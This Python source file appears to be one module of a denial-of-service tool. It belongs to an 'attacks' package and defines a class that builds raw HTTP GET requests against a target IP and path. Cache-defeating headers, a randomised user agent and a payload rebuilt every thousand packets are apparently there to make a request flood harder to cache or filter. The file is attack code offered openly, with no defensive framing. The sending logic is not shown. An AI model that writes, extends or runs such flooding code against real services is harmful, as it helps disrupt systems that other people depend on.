from typing import Optional

from constants import CRLF
from shared.attacks import AttackRequest
from shared.attacks.core import BaseService
from shared.attacks.http import HttpAddress
from shared.randoms import Random


class HttpService(BaseService):
    def __init__(self, attack_request: AttackRequest) -> None:
        self._attack_request = attack_request
        self.__unique_payload_counter = 0
        self.__cached_payload: Optional[bytes] = None

    def get_headers(self) -> str:
        return CRLF.join(
            (
                r"X-Requested-With: XMLHttpRequest",
                r"Connection: keep-alive",
                r"Pragma: no-cache",
                r"Cache-Control: no-cache",
                r"Accept-Encoding: gzip, deflate, br",
                rf"User-agent: {Random.get_user_agent()}",
            )
        )

    def _get_http_payload(self) -> bytes:
        if not isinstance(self._attack_request.address, HttpAddress):
            raise Exception("You can use only HttpAddress with this attack")

        address: HttpAddress = self._attack_request.address
        headers: str = self.get_headers()

        data = CRLF.join(
            (
                rf"GET {address.path} HTTP/1.1",
                rf"Host: {address.target.ip}",
                headers,
                rf"Connection: Close{CRLF}{CRLF}",
            )
        )

        return data.encode()

    @property
    def http_payload(self) -> bytes:
        """Change HTTP payload every 1000 packets"""
        if self.__unique_payload_counter % 1_000 == 0:
            self.__cached_payload = None

        self.__unique_payload_counter += 1

        return self.__cached_payload or self._get_http_payload()
